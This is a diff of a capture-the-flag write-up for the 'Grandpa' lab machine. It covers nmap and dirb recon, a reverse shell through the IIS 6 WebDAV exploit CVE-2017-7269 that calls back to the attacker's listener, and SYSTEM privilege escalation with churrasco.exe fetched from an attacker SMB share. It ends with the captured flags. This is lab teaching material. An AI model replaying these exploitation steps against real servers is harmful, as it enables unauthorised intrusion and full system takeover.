@@ -4,8 +4,11 @@
 
 ### Tools: nmap,
 
-### Vulnerabilities: WebDAV
+### Vulnerabilities: IIS, WebDAV, SeImpersonatePrivelege
 
+This is practically the same challenge as Granny except I used a different method to get into the system with grandpa.
+
+Nmap reveals port 80 is open. Navigating to the website bears no fruit.
 
 ```console
 └──╼ [★]$ sudo nmap -sC -A -O -Pn 10.129.137.82
@@ -42,6 +45,7 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 15.53 seconds
 ```
+dirb reveals almost the same directories as Granny including Aspnet client. However running a davtest does not let us PUT files on the system so we will not be using this entry point. This can also be confirmed from the nmap script scan above.
 
 ```console
 └──╼ [★]$ dirb http://10.129.137.82
@@ -86,6 +90,8 @@ GENERATED WORDS: 4612
 END_TIME: Wed Aug 17 21:15:35 2022
 DOWNLOADED: 23060 - FOUND: 9
 ```
+Instead we are going to use a script that also works on Granny. These machines share the same exploits.
+
 
 I had a lot of trouble getting this script to run since it was on an old version of python. Same issue I ran into on the Granny box. So I added the ```#!/usr/bin/env python2.7``` exploit can be found here https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
 
@@ -234,6 +240,8 @@ print data
 sock.close
 ```
 
+So be sure to set up your listner first and then run this script like so. If you get problems connecting then a instance reset should fix it.
+
 ```console
 └──╼ [★]$ ./grandpa.py 10.129.95.233 80 10.10.14.93 1234
 PROPFIND / HTTP/1.1
@@ -258,3 +266,98 @@ nt authority\network service
 c:\windows\system32\inetsrv>
 ```
 
+Cool were in but we cant get the flag yet. We need to privilege escalate and running whoami /priv shows the exact same vulnerability as Granny.
+
+```console
+C:\temp>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAuditPrivilege              Generate security audits                  Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+
+C:\temp>
+```
+
+So we are going to use churrasco.exe from https://github.com/jivoi/pentest/blob/master/exploit_win/churrasco
+
+Download it and then set up a fileshare in the same directory as the file you want to transfer.
+
+```console
+└──╼ [★]$ sudo impacket-smbserver share .
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+```
+Copy it over with this command while on the victim system.
+
+```console
+C:\temp>copy \\10.10.14.30\share\churrasco.exe 
+copy \\10.10.14.30\share\churrasco.exe
+        1 file(s) copied.
+```
+Running it like so will give us root access!
+
+```console
+C:\temp>churrasco.exe -d cmd.exe
+churrasco.exe -d cmd.exe
+/churrasco/-->Current User: NETWORK SERVICE 
+/churrasco/-->Getting Rpcss PID ...
+/churrasco/-->Found Rpcss PID: 672 
+/churrasco/-->Searching for Rpcss threads ...
+/churrasco/-->Found Thread: 676 
+/churrasco/-->Thread not impersonating, looking for another thread...
+/churrasco/-->Found Thread: 680 
+/churrasco/-->Thread not impersonating, looking for another thread...
+/churrasco/-->Found Thread: 688 
+/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x734
+/churrasco/-->Getting SYSTEM token from Rpcss Service...
+/churrasco/-->Found NETWORK SERVICE Token
+/churrasco/-->Found LOCAL SERVICE Token
+/churrasco/-->Found SYSTEM token 0x72c
+/churrasco/-->Running command with SYSTEM Token...
+/churrasco/-->Done, command should have ran as SYSTEM!
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\TEMP>whoami
+whoami
+
+C:\temp>whoami
+whoami
+nt authority\system
+
+C:\WINDOWS\TEMP>
+```
+
+Navigate to these locations and we get our 2 flags!
+
+```console
+C:\Documents and Settings\Harry\Desktop>type user.txt
+type user.txt
+bdff5ec67c3cff017f2bedc146a5d869
+```
+
+```console
+C:\Documents and Settings\Administrator\Desktop>type root.txt
+type root.txt
+9359e905a2c35f861f6a57cecf28bb7b
+```
+
+HOORAY!
+
+I was a little disappointed by this box being so similar to Granny or Vice versa. Maybe because its so old they did not have these exploits at the time making it a bit different. 
+At least this time I was able to get onto the system using a slightly different method than I did for Granny.
+Again you can run this through metasploit for a quicker machine but learning how these things work is important for harder machines.
